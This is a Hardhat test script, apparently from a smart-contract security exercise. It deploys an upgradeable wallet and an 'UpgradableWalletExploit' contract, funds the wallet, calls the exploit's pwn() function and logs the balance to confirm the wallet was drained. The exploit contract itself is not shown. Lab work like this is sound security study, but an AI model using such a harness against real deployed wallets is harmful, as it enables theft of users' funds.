const {ethers} = require("hardhat");
const {expect} = require("chai");

describe("WalletHijack", function () {

    let walletHijack, wallet, upgradableWallet;
    let walletHijack_deployed, wallet_deployed, upgradableWallet_deployed;

    it("should hijack the wallet", async function () {



        wallet = await ethers.getContractFactory("WalletImplementation");
        wallet_deployed = await wallet.deploy();

        upgradableWallet = await ethers.getContractFactory("UpgradableWallet");
        upgradableWallet_deployed = await upgradableWallet.deploy(wallet_deployed.address);       


        walletHijack = await ethers.getContractFactory("UpgradableWalletExploit");
        walletHijack_deployed = await walletHijack.deploy(upgradableWallet_deployed.address);


        // 1) Send first some ethers to the wallet
        [owner] = await ethers.getSigners()
        await owner.sendTransaction({to:wallet_deployed.address, value: ethers.utils.parseEther("1.0")});

        // 2) Check the balance of the wallet
        let balance = await ethers.provider.getBalance(wallet_deployed.address);
        console.log("Balance of the wallet: ", ethers.utils.formatEther(balance));

        // 3) Hijack the wallet
        await walletHijack_deployed.pwn();

        // 4) Check the balance of the wallet
        balance = await ethers.provider.getBalance(wallet_deployed.address);
        console.log("Balance of the wallet: ", ethers.utils.formatEther(balance));

        //await walletHijackContract.hijack(wallet_deployed);

        //const owner = await walletContract.owner();
        //expect(owner).to.equal(walletHijack_deployed);

    });

});